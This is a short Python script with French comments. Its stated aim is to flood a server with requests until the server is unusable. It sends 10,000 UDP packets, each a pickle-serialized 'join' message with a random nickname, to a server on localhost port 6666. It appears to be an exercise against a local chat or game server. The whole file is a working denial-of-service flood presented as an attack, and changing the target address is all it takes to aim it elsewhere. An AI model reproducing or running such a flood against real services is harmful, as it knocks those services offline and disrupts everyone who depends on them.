import pickle
import socket
import random
import string

#L'objectif de ce code est de surcharger le seerveur de requete afin de rendre ce dernier inutilisable

def generate_random_nickname():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10)) #génération d'un pseudo de 10 caractères en combinant lettres et chiffres

def send_request(server_ip, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.connect((server_ip, server_port))#Connexion au server
        for _ in range(10000):  # Envoi de 10000 requêtes
            nick = generate_random_nickname() #Création d'un pseudo et envoi de packet
            packet = pickle.dumps({"type": "join", "nick": nick}) #pickle.dumps sert à serialiser l'objet python en séquence de bytes
            sock.send(packet)
            print(f"Sent join request for {nick}")

if __name__ == "__main__":
    SERVER_IP = "127.0.0.1"
    SERVER_PORT = 6666
    send_request(SERVER_IP, SERVER_PORT)